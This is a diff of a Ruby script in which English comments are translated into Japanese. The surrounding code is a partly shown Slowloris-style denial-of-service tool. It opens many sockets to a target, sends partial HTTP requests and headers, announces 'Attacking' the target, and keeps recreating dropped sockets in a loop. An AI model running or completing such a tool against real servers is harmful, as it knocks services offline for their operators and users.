@@ -8,7 +8,7 @@ def init_socket(target)
 
   socket.write(("GET /?%{n} HTTP/1.1\r\n" % { n: $prng.rand(2000) }).encode("utf-8"))
   
-  # headers
+  # ヘッダ
   $regular_headers.each { |h|
     socket.write("#{h}\r\n".encode("utf-8"))
   }
@@ -22,7 +22,7 @@ def main
   
   puts("Attacking #{target} with #{socket_count} sockets.")
   
-  # creates sockets for the 1st time
+  # 1つ目のソケットを作成
   puts("ソケットを作成中.")
   for i in (1..socket_count)
     begin
@@ -45,7 +45,7 @@ def main
       end            
     }
     
-    # recreates dead sockets
+    # 死んだソケットを再生成
     for i in (1..(socket_count - $sockets.size))
       puts("ソケットを再生成中")
       begin
@@ -56,7 +56,7 @@ def main
       end      
     end
     
-    # sleeps for a while
+    # 一時休止
     sleep(15)
   end
 end
